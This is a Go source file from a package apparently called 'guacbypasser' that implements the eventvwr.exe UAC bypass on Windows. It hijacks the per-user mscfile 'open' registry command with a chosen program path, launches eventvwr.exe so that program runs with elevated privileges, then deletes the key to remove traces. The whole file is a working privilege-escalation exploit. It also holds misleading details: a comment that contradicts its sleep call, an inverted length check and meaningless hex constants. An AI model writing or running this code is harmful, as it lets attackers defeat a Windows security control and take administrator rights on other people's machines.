package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func HWND_W32_Method_Eventvwr(path string) error {
	var wkey32 registry.Key
	var err error

	var c = __W32_Eventvwr__{
		Type:   "_eventvwr",
		Method: "registry-command",
		Scode: [4]uintptr{
			0x0331, 0x978ef,
			0xee, 0x53ce,
		},

		Location:    fmt.Sprintf("%s\\_eventvwr.gUAC", os.Getenv("APPDATA")),
		_K_Eventvwr: 0x1,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Fatal(err)
	}

	_, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		log.Fatal(err)
	}

	wkey32, err = registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	if err != nil {
		log.Fatal(err)
	}

	// Setting DEFAULT key value for the ABSOLUTE program path
	// +0x23df ...

	if err := wkey32.SetStringValue("", currentDir); err != nil {
		log.Fatal(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wkey32.Close(); err != nil {
		log.Fatal(err)
	}

	// Sleep for 4 seconds ...
	time.Sleep(1 * 1 * time.Second)

	// Executing EventVWR.exe
	// Executing ABSOLUTE program name with high privileges

	var cmd = exec.Command("eventvwr.exe")
	err = cmd.Run()

	time.Sleep(1 * 1 * time.Second)
	err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\mscfile\shell\open\command`)
	if err != nil {
		log.Fatal(err)
	}

	return err
}
